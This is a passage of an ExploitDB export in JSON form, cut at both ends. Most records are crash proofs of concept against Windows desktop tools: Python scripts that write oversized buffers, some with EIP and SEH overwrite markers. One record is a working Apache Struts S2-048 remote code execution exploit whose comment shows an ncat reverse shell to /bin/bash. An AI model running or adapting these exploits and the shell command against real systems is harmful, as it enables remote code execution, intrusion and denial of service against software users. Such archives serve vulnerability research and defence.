1.31 - '.m3u' Crash (PoC)", "author": "0dem", "_id": 19265, "source": "ExploitDB", "platform": "windows", "date": "2012-06-18T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n#\r\n# Exploit Title     \t: RPCScan v2.03 Hostname/IP Field Local BoF PoC\r\n# Discovery by      \t: Irving Aguilar\r\n# Email\t\t\t: im.aguilar@protonmail.ch\r\n# Discovery Date    \t: 05.05.2016\r\n# Software Link     \t: http://www.mcafee.com/us/downloads/free-tools/rpcscan.aspx#\r\n# Tested Version    \t: 2.03\r\n# Vulnerability Type\t: Denial of Service (DoS) Local\r\n# Tested on OS\t\t: 
Windows 7 Enterprise SP1 x64 en\r\n#\r\n#\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python RPCScan-BoF.py\r\n# 2.- Open RPCScan-BoF.txt and copy content to clipboard\r\n# 3.- Open RPCScan2.exe\r\n# 4.- Clic button Ok\r\n# 5.- Paste Clipboard Scan > Hostname/IP\r\n# 6.- Clic on add button (->)\r\n# 7.- Clic button Aceptar\r\n# 8.- Crashed\r\n \r\nbuffer = \"\\x41\" * 388\r\neip = \"\\x42\" * 4\r\n \r\nf = open (\"RPCScan-BoF.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "RPCScan 2.03 - Hostname/IP Field Crash (PoC)", "author": "Irving Aguilar", "_id": 39775, "source": "ExploitDB", "platform": "windows", "date": "2016-05-06T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# -*- 
coding: utf-8 -*-\r\n# Exploit Title\u00a0\u00a0\u00a0\u00a0 : SuperScan 4.1 Scan Hostname/IP Field Buffer Overflow Crash PoC\r\n# Discovery by\u00a0\u00a0\u00a0\u00a0\u00a0 : Luis Mart\u00ednez\r\n# Email\t\t    : l4m5@hotmail.com\r\n# Discovery Date\u00a0\u00a0\u00a0 : 18/11/2015\r\n# Vendor Homepage\u00a0\u00a0 : http://www.foundstone.com\r\n# Software Link\u00a0\u00a0\u00a0\u00a0 : http://www.mcafee.com/us/downloads/free-tools/superscan.aspx\r\n# Tested Version\u00a0\u00a0\u00a0 : 4.1\r\n# Vulnerability Type\u00a0\u00a0\u00a0 : Denial of Service (DoS) Local\r\n# Tested on OS\u00a0\u00a0\u00a0\u00a0\u00a0 : Windows XP Professional SP3 x86 es\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python super_scan_4.1.py\r\n# 2.- Open super_scan_4.1.txt and copy content to clipboard\r\n# 3.- Open SuperScan4.1.exe\r\n# 4.- Paste Clipboard Scan > Hostname/IP\r\n# 5.- Clic on add button (->)\r\n# 6.- Crashed\r\n\r\nbuffer = \"\\x41\" * 636\r\neip = \"\\x42\" * 4\r\n\r\nf = open (\"super_scan_4.1.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "SuperScan 4.1 - Scan Hostname/IP Field Buffer Overflow", "author": "Luis Mart\u00ednez", "_id": 38758, "source": "ExploitDB", "platform": "windows", "date": "2015-11-19T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: ipPulse 1.92 - 'IP Address/HostName-Comment' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2018-07-27\r\n# Vendor Homepage: https://www.netscantools.com/ippulseinfo.html\r\n# Software Link : http://download.netscantools.com/ipls192.zip\r\n# Tested Version: 1.92\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : 
python ipPulse_1.92.py\r\n# 2.- Open ipPulse_1.92.txt and copy content to clipboard\r\n# 3.- Open ippulse.exe\r\n# 4.- Target Editor\r\n# 5.- Paste ClipBoard on \"IP Address/HostName\"\r\n# 6.- Paste ClipBoard on \"Comment\"\r\n# 7.- Add Above Fields to Target List >>\r\n# 8.- OK\r\n# 9.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 3400\r\nf = open (\"ipPulse_1.92.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "ipPulse 1.92 - 'IP Address/HostName-Comment' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 45102, "source": "ExploitDB", "platform": "windows", "date": "2018-07-30T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: iSmartViewPro 1.5  - 'Password' Buffer Overflow\r\n# Discovery by: Javier Enrique Rodriguez Gutierrez\r\n# Discovery Date: 2018-08-09\r\n# Vendor Homepage: https://securimport.com/\r\n# Software Link: https://securimport.com/university/videovigilancia-ip/software/493-software-ismartviewpro-v1-5\r\n# Tested Version: 1.5\r\n# Vulnerability Type: Buffer Over Flow Local\r\n# Tested on OS: Windows 7 Professional x64 es\r\n  \r\n# Steps to Produce the BoF: \r\n# 1.- Run python code : python generate.py\r\n# 2.- Open generate.txt and copy content to clipboard\r\n# 3.- Open iSmartViewPro\r\n# 4.- clic button \"+\"\r\n# 5.- Select \"add device manually\"\r\n# 6.- device alias -> \"admin\"\r\n# 7.- DNS/IP/DID -> \"0.0.0.0\"\r\n# 8.- acount -> \"admin\"\r\n# 9.- paste ClipBoard on \"Password\"\r\n# 10.- Save\r\n# 11.- BoF\r\n \r\n#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\nbuffer = \"\\x41\" * 447\r\neip = \"\\x42\" * 4\r\nf = open (\"generate.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "iSmartViewPro 1.5 - 'Password' Buffer Overflow", 
"author": "Javier Enrique Rodriguez Gutierrez", "_id": 45176, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-08-10T00:00:00+00:00", "cve": [], "type": "local", "port": 0}, {"code": "#!/usr/bin/python\r\n# -*- coding: utf-8 -*-\r\n\r\n# 
Just a demo for CVE-2017-9791\r\n\r\n\r\nimport requests\r\n\r\n\r\ndef exploit(url, cmd):\r\n    print(\"[+] command: %s\" % cmd)\r\n\r\n    payload = \"%{\"\r\n    payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\"\r\n    payload += \"(#_memberAccess?(#_memberAccess=#dm):\"\r\n    payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\"\r\n    payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\"\r\n    payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\"\r\n    payload += \"(#ognlUtil.getExcludedClasses().clear()).\"\r\n    payload += 
\"(#context.setMemberAccess(#dm)))).\"\r\n    payload += \"(@java.lang.Runtime@getRuntime().exec('%s'))\" % cmd\r\n    payload += \"}\"\r\n\r\n    data = {\r\n        \"name\": payload,\r\n        \"age\": 20,\r\n        \"__checkbox_bustedBefore\": \"true\",\r\n        \"description\": 1\r\n    }\r\n\r\n    headers = {\r\n        'Referer': 'http://127.0.0.1:8080/2.3.15.1-showcase/integration/editGangster'\r\n    }\r\n    requests.post(url, data=data, headers=headers)\r\n\r\n\r\nif __name__ == '__main__':\r\n    import sys\r\n\r\n    if len(sys.argv) != 3:\r\n        print(\"python %s <url> <cmd>\" % sys.argv[0])\r\n        sys.exit(0)\r\n\r\n    print('[*] exploit Apache Struts2 S2-048')\r\n    url = sys.argv[1]\r\n    cmd = sys.argv[2]\r\n\r\n    exploit(url, cmd)\r\n\r\n    # $ ncat -v -l -p 4444 &\r\n    # $ python exploit_S2-048.py http://127.0.0.1:8080/2.3.15.1-showcase/integration/saveGangster.action \"ncat -e /bin/bash 127.0.0.1 4444\"", "description": "Apache Struts 2.3.x Showcase - Remote Code Execution", "author": "Vex Woo", "_id": 42324, "source": "ExploitDB", "platform": "multiple", "date": "2017-07-07T00:00:00+00:00", "cve": ["CVE-2017-9791"], "type": "webapps", "port": 0}, {"code": "# Exploit Title: Skype Empresarial Office 365 16.0.10730.20053 - 'Direcci\u00f3n de inicio de sesi\u00f3n' Denial of service (PoC)\r\n# Discovery by: Samuel Cruz\r\n# Discovery Date; 2018-08-29\r\n# Vendor Homepage: https://www.skype.com/es/business/\r\n# Tested Version: 16.0.10730.20053\r\n# Tested on OS: Windows 10 Pro x64 es/home/\r\n\r\n#Steps to produce the crash\r\n#1.- Run python code : python SkypeforBusiness_16.0.10730.20053.py\r\n#2.- Open SkypeforBusiness.txt and copy context to clipboard\r\n#3.- Open Skype for business\r\n#4.- Paste clipboard on \"Direcci\u00f3n de inicio de sesi\u00f3n\"\r\n#5.- Iniciar sesi\u00f3n\r\n#6.- Crashed\r\n\r\nbuffer = \"\\x41\" * 595\r\nf = open (\"SkypeforBusiness.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Skype Empresarial Office 365 16.0.10730.20053 - 'Direcci\u00f3n de inicio de sesi\u00f3n' Denial of service (PoC)", "author": "Samuel Cruz", "_id": 45295, "source": "ExploitDB", 
"platform": "windows_x86-64", "date": "2018-08-29T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# -*- coding: utf-8 -*-\r\n# Exploit Title: SmartFTP 9.0 Build 2623 - Denial of Service (PoC)\r\n# Date: 06/12/2018\r\n# Exploit Author: Alejandra S\u00e1nchez\r\n# Vendor Homepage: https://www.smartftp.com/en-us/\r\n# Software Link: https://www.smartftp.com/get/SFTPMSI64.exe\r\n# Version: 9.0.2623.0\r\n# Tested on: Windows Server 2016 (x64)/ Windows 10 Single Language x64\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python SmartFTPClient.py\r\n# 2.- Open SmartFTPClient.txt and copy content to clipboard\r\n# 3.- Open SmartFTP Client \r\n# 4.- New connection\r\n# 5.- Paste ClipBoard on Host \r\n# 6.- Crashed\r\n\r\n\r\nbuffer 
= \"\\x41\" * 256\r\nf = open (\"SmartFTPClient.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "SmartFTP Client 
9.0.2623.0 - Denial of Service (PoC)", "author": "Alejandra S\u00e1nchez", "_id": 45966, "source": "ExploitDB", "platform": "windows", "date": "2018-12-11T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#Exploit Title: SpotAuditor 5.3.2 - 
'Name' Denial Of Service\r\n#Exploit Author : ZwX\r\n#Exploit Date: 2019-11-28\r\n#Vendor Homepage : http://www.nsauditor.com/\r\n#Link Software : http://spotauditor.nsauditor.com/downloads/spotauditor_setup.exe\r\n#Tested on OS: Windows 7\r\n#Social: twitter.com/ZwX2a\r\n#contact: msk4@live.fr\r\n\r\n'''\r\nProof of Concept (PoC):\r\n=======================\r\n\r\n1.Download and install SpotAuditor\r\n2.Run the python operating script that will create a file (poc.txt)\r\n3.Run the software \"Register -> Enter Registration Code\r\n4.Copy and paste the characters in the file (poc.txt)\r\n5.Paste the characters in the field 'Name' and click on 'Ok'\r\n6.SpotAuditor Crashed\r\n'''\r\n#!/usr/bin/python\r\n\r\nhttp = \"http//\"\r\nbuffer = \"\\x41\" * 2000\r\n\r\n\r\npoc = http + buffer \r\nfile = open(\"poc.txt\",\"w\")\r\nfile.write(poc)\r\nfile.close()\r\n \r\nprint \"POC Created by ZwX\"", "description": "SpotAuditor 5.3.2 - 'Name' Denial of Service", "author": "ZwX", "_id": 47727, "source": "ExploitDB", "platform": "windows", "date": "2019-11-29T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Duplicate Cleaner Pro 4 - Denial of Service (PoC)\r\n# Date: 2020-01-05\r\n# Vendor Homepage:https://www.digitalvolcano.co.uk/index.html\r\n# Software Link:  https://www.digitalvolcano.co.uk/download/DuplicateCleanerPro4_setup.exe\r\n# Exploit Author: Achilles\r\n# Tested Version: 4.1.3\r\n# Tested on: Windows 7 x64\r\n\r\n\r\n# 1.- Run python code :\r\n# 2.- Open EVIL.txt and copy content to clipboard\r\n# 3.- Open Duplicate Cleaner Pro\r\n# 4.- Paste the content of EVIL.txt into the Field: 'License key'\r\n# 5.- 
Click 'Activate' and you will see a crash.\r\n\r\n#!/usr/bin/env python\r\nbuffer =3D \"\\x41\" * 6000\r\n\r\ntry:\r\nf.open(\"Evil.txt\",\"w\")\r\nprint \"[+] Creating %s bytes evil payload..\" %len(buffer)\r\nf.write(buffer)\r\nf.close()\r\nprint \"[+] File created!\"\r\nexcept:\r\nprint \"File cannot be created\"", "description": "Duplicate Cleaner Pro 4 - Denial of Service (PoC)", "author": "stresser", "_id": 47873, "source": "ExploitDB", "platform": "windows", "date": "2020-01-06T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: ASPRunner Professional v6.0.766 - Denial of Service (PoC)\r\n# Discovery by: Rafael Pedrero\r\n# Discovery Date: 2019-01-30\r\n# Vendor Homepage: http://www.xlinesoft.com/asprunnerpro\r\n# Software Link : http://www.xlinesoft.com/asprunnerpro\r\n# Tested Version: v6.0.766\r\n# Tested on: Windows XP SP3\r\n# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run AspRunnerPro.exe\r\n# 2.- copy content AspRunnerPro_Crash.txt or 180 \"A\" to clipboard (result from this python script)\r\n# 3.- Go to Wizard \"Create a new project\" - in \"Project name:\" field paste the result (180 \"A\" or more)\r\n# 4.- Click in Next button and you will see a 
crash.\r\n\r\n#!/usr/bin/env python\r\n\r\ncrash = \"\\x41\" * 180\r\nf = open (\"AspRunnerPro_Crash.txt\", \"w\")\r\nf.write(crash)\r\nf.close()", "description": "ASPRunner Professional 6.0.766 - Denial of Service (PoC)", "author": "Rafael Pedrero", "_id": 46293, "source": "ExploitDB", "platform": "windows", "date": "2019-01-31T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: SpotAuditor v3.6.7 - Denial of Service (PoC)\r\n# Discovery by: Rafael Pedrero\r\n# Discovery Date: 2019-01-30\r\n# Vendor Homepage: http://www.nsauditor.com/order.html\r\n# Software Link : http://www.nsauditor.com/order.html\r\n# Tested Version: v3.6.7\r\n# Tested on: Windows XP SP3\r\n# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run SpotAuditor.exe\r\n# 2.- copy content SpotAuditor_Crash.txt to clipboard (result from this python script)\r\n# 3.- Go to \"Tools\" - \"Base64 Password Decoder\" and paste the result in the \"Base64 Encrypted Password:\" textbox.\r\n# 4.- Click in Decrypt button and you will see a crash.\r\n\r\n\r\n#!/usr/bin/env python\r\n\r\n\r\ncrash = \"\\x41\" * 2000\r\nf = open (\"SpotAuditor_Crash.txt\", \"w\")\r\nf.write(crash)\r\nf.close()", "description": "SpotAuditor 3.6.7 - 'Base64 Encrypted Password' Denial of Service (PoC)", "author": "Rafael Pedrero", "_id": 46313, "source": "ExploitDB", "platform": "windows", "date": "2019-02-04T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"source": "CVE", "_id": "2019-17514", "description": "library/glob.html in the Python 2 and 3 documentation before 2016 has potentially misleading information about whether sorting occurs, as demonstrated by irreproducible cancer-research results. NOTE: the effects of this documentation cross application domains, and thus it is likely that security-relevant code elsewhere is affected. This issue is not a Python implementation bug, and there are no reports that NMR researchers were specifically relying on library/glob.html. In other 
words, because the older documentation stated \"finds all the pathnames matching a specified pattern according to the rules used by the Unix shell,\" one might have incorrectly inferred that the sorting that occurs in a Unix shell also occurred for glob.glob. There is a workaround in newer versions of Willoughby nmr-data_compilation-p2.py and nmr-data_compilation-p3.py, which call 
sort() directly.", "osvdb": [], "bid": [], "cve": ["CVE-2019-17514"], "msb": []}, {"code": "# Exploit Title: Foscam Video Management System 1.1.6.6 - 'UID' Denial of Service (PoC)\r\n# Author: Alessandro Magnosi\r\n# Date: 2019-10-09\r\n# Vendor Homepage: 
https://www.foscam.com/\r\n# Software Link : https://www.foscam.com/downloads/appsoftware.html?id=5\r\n# Tested Version: 1.1.6.6\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 7 SP1 x86 en, Windows 10 Pro x64 it\r\n\r\n# 
Steps to Produce the Crash: \r\n# 1.- Run python code : python foscam-vms-uid-dos.py\r\n# 2.- Open FoscamVMS1.1.6.txt and copy its content to clipboard\r\n# 3.- Open FoscamVMS\r\n# 4.- Go to Add Device\r\n# 5.- Choose device type \"NVR\"\r\n# 6.- Copy the 
content of the file into UID\r\n# 7.- Click on Login Check\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/python\r\n \r\nbuffer = \"A\" * 5000\r\nf = open (\"FoscamVMS1.1.6.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Foscam Video Management System 
1.1.6.6 - 'UID' Denial of Service (PoC)", "author": "Alessandro Magnosi", "_id": 47478, "source": "ExploitDB", "platform": "windows", "date": "2019-10-09T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: CdBurnerXP 4.5.8.6795 - 'File Name' Denial of Service (PoC)\r\n# Discovery by: Alan Baeza\r\n# Discovery Date: 2018-09-13\r\n# Vendor Homepage: https://cdburnerxp.se/\r\n# Software Link: https://cdburnerxp.se/downloadsetup.exe\r\n# Tested Version: 4.5.8.6795\r\n# Tested on OS  : Windows 10 Pro x64 es\r\n\r\n#!/usr/bin/env python\r\n#-*-coding: utf-8-*-\r\n# Steps to Produce the DoS: \r\n# 1.- Run python code : python dos.py\r\n# 2.- Open generate.txt and copy content to clipboard\r\n# 3.- Open CdBurnerXP\r\n# 4.- Select option \"Copy or grab disc\"\r\n# 5.- Select checkbox target \"Hard disk\"\r\n# 6.- Paste ClipBoard on \"File name\"\r\n# 7.- Clic Copy disc\r\n# 8.- DoS\r\n\r\nimport socket, os, sys\r\n\r\nbuffer = \"\\x41\" * 260\r\n\r\nf = open (\"generate.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "CdBurnerXP 4.5.8.6795 - 'File Name' Denial of Service (PoC)", "author": "Alan Joaqu\u00edn Baeza Meza", "_id": 45410, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-09-14T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: UltraISO 9.7.1.3519 - 'Output FileName' Denial of Service (PoC) and Pointer to next SEH and SE handler records overwrite\r\n# Discovery by: Francisco Ramirez\r\n# Discovery Date: 2018-12-14\r\n# Vendor Homepage: https://www.ultraiso.com/\r\n# Software Link : https://www.ultraiso.com/download.html\r\n# Tested Version: 9.7.1.3519\r\n# Tested on: Windows 10 Pro - 64 bit\r\n# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow\r\n \r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python UltraISO_9.7.1.3519.py\r\n# 2.- Open UltraISO_9.7.1.3519.txt and copy content to clipboard\r\n# 3.- Open UltraISO_9.7.1.3519\r\n# 4.- In the Window select 'Tools' > 'Make CD/DVD Image' \r\n# 
5.- In the field  'Output FileName' remove the default path.\r\n# 6.- Paste the content of UltraISO_9.7.1.3519.txt into the field: 'Output FileName'\r\n# 7.- Click 'Make' and you will see a crash.\r\n \r\n#!/usr/bin/env python\r\n  \r\na_letters = \"\\x41\" * 304\r\nseRecord = \"\\x42\" * 4\r\nsehRecord = \"\\x43\" * 4\r\nbuffer = a_letters + seRecord + sehRecord\r\nf = open (\"UltraISO_9.7.1.3519.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "UltraISO 9.7.1.3519 - 'Output FileName' Denial 
of Service (PoC)", "author": "Francisco Ramirez", "_id": 45996, "source": "ExploitDB", "platform": "windows", "date": "2018-12-14T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Angry IP Scanner for Linux 3.5.3 - Denial of Service (PoC)\r\n# Discovery by: Mr Winst0n\r\n# Discovery Date: 2018-12-22\r\n# Vendor Homepage: https://angryip.org/\r\n# Software Link : https://angryip.org/download/\r\n# Tested Version: 3.5.3 (latest version)\r\n# Tested on: Kali linux\r\n# Vulnerability Type: Denial of Service (DoS)\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python angryip.py\r\n# 2.- Open Xangry.txt and copy content to clipboard\r\n# 3.- Open Angry IP Scanner\r\n# 4.- Go to \"Tools\" in toolbar, click on \"Preferences\", then in the tab \"Ports\",\r\n# 5.- Paste ClipBoard on \"Port selection\", and click on \"OK\",\r\n# 6.- Crashed\r\n\r\n#!/usr/bin/env python\r\n\r\nbuffer = \"\\x41\" * 384\r\ncrash = buffer + \"BBBB\" + \"CCCC\"\r\nf = open(\"Xangry.txt\", \"w\")\r\nf.write(crash)\r\nf.close()", "description": "Angry IP Scanner for Linux 3.5.3 - Denial of Service (PoC)", "author": "Sam", "_id": 46038, "source": "ExploitDB", "platform": "linux", "date": "2018-12-24T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: NBMonitor Network Bandwidth Monitor 1.6.5.0 - 'Name' Denial of Service (PoC)\r\n# Author: Luis Martinez\r\n# Date: 2018-12-27\r\n# Vendor Homepage: www.nsauditor.com\r\n# Software Link : http://www.nbmonitor.com/downloads/nbmonitor_setup.exe\r\n# Tested Version: 1.6.5.0\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python NBMonitor_1.6.5.0.py\r\n# 2.- Open NBMonitor_1.6.5.0.txt and copy content to clipboard\r\n# 3.- Open NBMonitor\r\n# 4.- Register -> Enter Registration Code\r\n# 5.- Paste ClipBoard on \"Name:\"\r\n# 6.- Key: -> 1\r\n# 7.- OK\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 276\r\nf = open (\"NBMonitor_1.6.5.0.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "NBMonitor Network Bandwidth Monitor 1.6.5.0 - 'Name' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 46064, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2019-01-02T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: SpotFTP Password Recover 2.4.2 - 'Name' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2019-01-04\r\n# Vendor Homepage: www.nsauditor.com\r\n# Software Link : http://www.nsauditor.com/downloads/spotftp_setup.exe\r\n# Tested Version: 2.4.2\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python SpotFTP_Password_Recover_2.4.2.py\r\n# 2.- Open SpotFTP_Password_Recover_2.4.2.txt and copy content to clipboard\r\n# 3.- Open SpotFTP\r\n# 4.- Register -> Enter Registration Code...\r\n# 5.- Paste ClipBoard on \"Name:\"\r\n# 6.- Key: -> L4M5\r\n# 7.- OK\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" 
* 256\r\nf = open (\"SpotFTP_Password_Recover_2.4.2.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "SpotFTP Password Recover 2.4.2 - 'Name' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 46088, "source": "ExploitDB", "platform": "windows", "date": "2019-01-07T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# Title : Internet Download Manager - Crash Proof Of Concept\r\n# Affected Versions: All Version\r\n# Founder : InternetDownloadManager\r\n# Tested on Windows 7 / Server 2008\r\n#\r\n#\r\n# Author      :   Mohammad Reza Espargham\r\n# Linkedin    :   https://ir.linkedin.com/in/rezasp\r\n# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com\r\n# Website     :   www.reza.es\r\n# Twitter     :   https://twitter.com/rezesp\r\n# FaceBook    :   https://www.facebook.com/mohammadreza.espargham\r\n#\r\n#\r\n# downlWithIDM64.dll Exploit\r\n#\r\n#\r\n# 1 . run python code : python crash.py\r\n# 2 . open \"IDM\"\r\n# 3 . Tasks 
--> Import --> From IDM export file\r\n# 4 . select r3z4.ief\r\n# 5 . Crashed ;)\r\n\r\n\r\nhdr = \"<\" #start syntax\r\nhcr = \"ftp://\" #pro\r\ncrash = \"\\x41\"*1992999 #B0F\r\nexp = hdr+hcr+crash+hdr+hcr+crash\r\nfile = open(\"r3z4.ief\", \"w\")\r\nfile.write(exp)\r\nfile.close()", "description": "Internet Download Manager - '.ief' Crash (PoC)", "author": "Mohammad Reza Espargham", "_id": 37607, "source": "ExploitDB", "platform": "windows", "date": "2015-07-14T00:00:00+00:00", "cve": [], "type": "dos", 
"port": 0}, {"code": "#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n# Exploit Title\t: QNap QVR Client 5.1.0.11290 Crash PoC\r\n# Discovery by\t: Luis Mart\u00ednez\r\n# Email\t\t: l4m5@hotmail.com\r\n# Discovery Date\t: 05/11/2015\r\n# Vendor Homepage: http://www.qnapsecurity.com/n/en/\r\n# Software Link\t: http://download.qnap.com/Surveillance/Utility/QMon_20150630.zip\r\n# Tested Version\t: 5.1\r\n# Vulnerability Type\t: Denial of Service (DoS) Local\r\n# Tested on OS\t: Windows 10 Pro x64 es\r\n# 
Steps to Produce the Crash: \r\n# 1.- Run python code : python qvr_client_5.1.py\r\n# 2.- Open qvr_client_5.1.txt and copy content to clipboard\r\n# 3.- Open QVR Client\r\n# 4.- Direccion IP/Puerto -> 10.10.10.1 / 80\r\n# 5.- Paste ClipBoard on \"Nombre de Usuario\"\r\n# 6.- Contrase\u00f1a -> test\r\n# 7.- Aceptar\r\n# 8.- Crashed\r\n\r\nbuffer = \"\\x41\" * 260\r\nf = open (\"qvr_client_5.1.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "QNap QVR Client 5.1.0.11290 - Crash (PoC)", "author": "Luis Mart\u00ednez", "_id": 38650, "source": "ExploitDB", "platform": "windows", "date": "2015-11-07T00:00:00+00:00", "cve": 
[], "type": "dos", "port": 0}, {"code": "# Title : KeePass Password Safe Classic 1.29 - Crash Proof Of Concept\r\n# Affected Versions: All Version\r\n# Founder : keepass.info\r\n# Tested on Windows 7 / Server 2008\r\n# Download Link : http://sourceforge.net/projects/keepass/files/KeePass%201.x/1.30/KeePass-1.30.zip\r\n#\r\n#\r\n# Author\u00a0\u00a0\u00a0\u00a0\u00a0 :\u00a0\u00a0 Mohammad Reza Espargham\r\n# Linkedin\u00a0\u00a0\u00a0 :\u00a0\u00a0 https://ir.linkedin.com/in/rezasp\r\n# E-Mail\u00a0\u00a0\u00a0\u00a0\u00a0 :\u00a0\u00a0 me[at]reza[dot]es , reza.espargham[at]gmail[dot]com\r\n# Website\u00a0\u00a0\u00a0\u00a0 :\u00a0\u00a0 www.reza.es\r\n# Twitter\u00a0\u00a0\u00a0\u00a0 :\u00a0\u00a0 https://twitter.com/rezesp\r\n# FaceBook\u00a0\u00a0\u00a0 
:\u00a0\u00a0 https://www.facebook.com/reza.espargham\r\n#\r\n#\r\n# 1 . run python code : python crash.py\r\n# 2 . open \u201cKeePass\u201d\r\n# 3 . File \u2014> New (Create New Password Database)\r\n# 4 . File \u2014> Import \u2014> CSV File\u2026\r\n# 5 . open r3z4.csv\r\n# 6 . Right Click on \u201cR3Z4\u201d username and edit\r\n# 7 . Crashed ;)\r\n\r\n\r\n\r\n#!/usr/bin/env python\r\nhdr = '\"' #start syntax\r\nhcr = \"R3Z4\" #user\r\noth = ',\"' #user\r\noth2 = '\",\"\",\"\"' #user\r\nval=','\r\ncrash = \"\\x41\"*199289 #B0F\r\nexp = hdr+hcr+hdr+val+hdr+hcr+hdr+oth+crash+oth2\r\nfile = open(\"r3z4.csv\", \"w\")\r\nfile.write(exp)\r\nfile.close()", "description": "KeePass Password Safe Classic 1.29 - Crash (PoC)", "author": "Mohammad Reza Espargham", "_id": 39216, "source": "ExploitDB", "platform": "windows", "date": "2016-01-11T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n# Exploit Title     : NetSchedScan v1.0 scan Hostname/IP Field Buffer Overflow Crash PoC\r\n# Discovery by      : Abraham Espinosa\r\n# Email        \t    : hechoenmexicomx@hotmail.com\r\n# Discovery Date    : 14/01/2016\r\n# Vendor Homepage   : http://www.foundstone.com\r\n# Software Link     : http://www.mcafee.com/us/downloads/free-tools/netschedscan.aspx#\r\n# Tested Version    : 1.0\r\n# Vulnerability Type    : Denial of Service (DoS) Local\r\n# Tested on OS      : Windows 8.1 x64 es\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python NetSchedScan.py\r\n# 2.- Open NetSchedScan.txt and copy content to clipboard\r\n# 3.- Open NetSchedScan.exe\r\n# 4.- Clic button Ok\r\n# 5.- Paste Clipboard Scan > Hostname/IP\r\n# 6.- Clic on add button (->)\r\n# 7.- Clic button Aceptar\r\n# 8.- Crashed\r\n \r\nbuffer = \"\\x41\" * 388\r\neip = \"\\x43\" * 4\r\n \r\nf = open (\"NetSchedScan.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "NetSchedScan 1.0 - Crash (PoC)", "author": "Abraham Espinosa", "_id": 39242, "source": "ExploitDB", "platform": "windows", "date": "2016-01-15T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: QNap QVR Client 5.1.1.30070 - 'Password' Denial of Service (PoC)\r\n# Discovery by: Luis Mart\u00ednez\r\n# Discovery 